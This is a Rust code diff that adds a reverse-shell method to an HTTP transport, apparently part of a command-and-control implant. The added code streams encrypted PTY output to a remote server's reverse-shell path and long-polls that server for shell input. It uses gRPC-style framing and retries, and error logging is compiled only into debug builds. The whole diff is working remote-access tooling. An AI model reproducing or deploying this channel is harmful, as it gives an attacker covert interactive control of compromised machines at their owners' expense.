@@ -460,9 +460,187 @@ impl Transport for HTTP {
 
     async fn reverse_shell(
         &mut self,
-        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
+        mut rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
         tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
     ) -> Result<()> {
-        unimplemented!("todo")
+        let base_url = self.base_url.clone();
+        let client = self.client.clone();
+
+        // Spawn task to send PTY output using repeated POST requests (client -> server)
+        let send_client = client.clone();
+        let send_url = base_url.clone();
+        tokio::spawn(async move {
+            let mut request_count = 0;
+            while let Some(req_chunk) = rx.recv().await {
+                request_count += 1;
+
+                #[cfg(debug_assertions)]
+                log::debug!("Sending reverse shell request {}", request_count);
+
+                // Marshal and encrypt the request
+                let request_bytes = match marshal_with_codec::<ReverseShellRequest, ReverseShellResponse>(req_chunk) {
+                    Ok(bytes) => bytes,
+                    Err(err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("Failed to marshal reverse shell request {}: {}", request_count, err);
+                        return;
+                    }
+                };
+
+                // Build POST request
+                let url = format!("{}{}", send_url, REVERSE_SHELL_PATH);
+                let uri: hyper::Uri = match url.parse() {
+                    Ok(u) => u,
+                    Err(err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("Failed to parse URL: {}", err);
+                        return;
+                    }
+                };
+
+                let req = match hyper::Request::builder()
+                    .method(hyper::Method::POST)
+                    .uri(uri)
+                    .header("Content-Type", "application/grpc")
+                    .body(hyper::Body::from(request_bytes))
+                {
+                    Ok(r) => r,
+                    Err(err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("Failed to build request: {}", err);
+                        return;
+                    }
+                };
+
+                // Send the request (fire and forget for PTY output)
+                match send_client.request(req).await {
+                    Ok(response) => {
+                        if response.status() != StatusCode::OK {
+                            #[cfg(debug_assertions)]
+                            log::error!("HTTP error sending reverse shell request: {}", response.status());
+                        }
+                    }
+                    Err(err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("Failed to send reverse shell request: {}", err);
+                        return;
+                    }
+                }
+            }
+
+            #[cfg(debug_assertions)]
+            log::debug!("Completed sending {} reverse shell requests", request_count);
+        });
+
+        // Spawn task for long-polling to receive PTY input (server -> client)
+        tokio::spawn(async move {
+            let mut poll_count = 0;
+            loop {
+                poll_count += 1;
+
+                #[cfg(debug_assertions)]
+                log::debug!("Reverse shell long poll {}", poll_count);
+
+                // Build GET request for long-polling
+                let url = format!("{}{}", base_url, REVERSE_SHELL_PATH);
+                let uri: hyper::Uri = match url.parse() {
+                    Ok(u) => u,
+                    Err(err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("Failed to parse URL: {}", err);
+                        return;
+                    }
+                };
+
+                let req = match hyper::Request::builder()
+                    .method(hyper::Method::GET)
+                    .uri(uri)
+                    .header("Content-Type", "application/grpc")
+                    .body(hyper::Body::empty())
+                {
+                    Ok(r) => r,
+                    Err(err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("Failed to build long poll request: {}", err);
+                        return;
+                    }
+                };
+
+                // Send long-poll request
+                let response = match client.request(req).await {
+                    Ok(r) => r,
+                    Err(err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("Failed to send long poll request: {}", err);
+                        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
+                        continue;
+                    }
+                };
+
+                if response.status() != StatusCode::OK {
+                    #[cfg(debug_assertions)]
+                    log::error!("HTTP error in long poll: {}", response.status());
+                    tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
+                    continue;
+                }
+
+                // Read response body with gRPC framing
+                let mut body = response.into_body();
+                let mut buffer = BytesMut::new();
+
+                loop {
+                    // Try to read complete gRPC frames from buffer
+                    while buffer.len() >= 5 {
+                        let message_length = u32::from_be_bytes([
+                            buffer[1],
+                            buffer[2],
+                            buffer[3],
+                            buffer[4],
+                        ]) as usize;
+
+                        if buffer.len() < 5 + message_length {
+                            break;
+                        }
+
+                        buffer.advance(5);
+                        let encrypted_message = buffer.split_to(message_length);
+
+                        let response_msg = match unmarshal_with_codec::<ReverseShellRequest, ReverseShellResponse>(
+                            &encrypted_message,
+                        ) {
+                            Ok(msg) => msg,
+                            Err(err) => {
+                                #[cfg(debug_assertions)]
+                                log::error!("Failed to unmarshal reverse shell response: {}", err);
+                                continue;
+                            }
+                        };
+
+                        if tx.send(response_msg).await.is_err() {
+                            #[cfg(debug_assertions)]
+                            log::error!("Failed to send reverse shell response through channel");
+                            return;
+                        }
+                    }
+
+                    // Read more data from HTTP body
+                    match body.data().await {
+                        Some(Ok(chunk)) => {
+                            buffer.extend_from_slice(&chunk);
+                        }
+                        Some(Err(_)) | None => {
+                            break;
+                        }
+                    }
+                }
+
+                // Small delay before next poll if no data
+                if buffer.is_empty() {
+                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+                }
+            }
+        });
+
+        Ok(())
     }
 }
